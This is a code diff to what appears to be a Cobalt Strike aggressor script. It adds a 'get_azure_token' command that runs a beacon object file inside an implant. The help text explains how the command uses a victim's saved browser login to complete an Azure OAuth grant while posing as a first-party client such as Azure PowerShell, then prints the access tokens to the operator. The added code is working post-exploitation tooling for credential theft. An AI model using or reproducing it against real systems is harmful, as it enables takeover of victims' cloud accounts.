@@ -2133,3 +2133,50 @@ Usage make_token_cert <path to .pfx> [opt: password]
 Takes the path to a .pfx and optionally the password to decrypt the .pfx.
 Reads it into the certificate store for the current user and creates an impersonation token with it.
 Then deletes it from the users certificate store.");
+
+alias get_azure_token
+{
+    #I'm going to do validation on the bof side since that works more cross implant
+    local('$clientid $scope $browserType $hint $browserPath $args')
+    if(size(@_) < 4)
+    {
+        berror($1, beacon_command_detail("get_azure_token"));
+        return;
+    }
+    $clientid = $2;
+    $scope = $3;
+    $browserType = $4;
+    $hint = iff(-istrue $5, $5, "");
+    $browserPath = iff(-istrue $6, $6, "");
+    $args = bof_pack($1, "zzizz", $clientid, $scope, $browserType, $hint, $browserPath);
+    beacon_inline_execute($1, readbof($1, "get_azure_token"), "go", $args);
+}
+
+beacon_command_register(
+    "get_azure_token",
+    "perform an OAuth code grant against azure and print the returned tokens",
+"Usage: get_azure_token <client-id> <scope> <browser (see below)> [opt: hint] [opt: browser_path]
+
+The client_id specified must already have consent in the tennant and accept http://localhost as the redirect URL
+see https://github.com/dirkjanm/ROADtools/blob/master/roadtx/roadtools/roadtx/firstpartyscopes.json for many examples.
+
+scope must match what is expected for the given client_id.  These can similarly be found in the roadtools link above.
+
+hint if provided should match the email of the user who you want to authenticate as.  There must exist an existing saved login for said user.
+When not provided this command will fail if more then one saved login exists.
+
+browser_path is the full path the the browser executable.  Use it if non-standard path or browser is used.
+
+browser should an integer with one of the following values:
+    0 (edge)
+    1 (chrome)
+    2 (default)
+    3 (other)
+default in this context means whatever the user has set as the default link handler for https.
+
+Example:
+   Log into azure pretending to be the first party Azure powershell module (Connect-AZAccount)
+    get_azure_token 1950a258-227b-4e31-a9cf-717495945fc2 \"74658136-14ec-4630-ad9b-26e160ff0fc6/user_impersonation offline_access openid profile\" 2 \"your azure email here\"
+
+"
+);
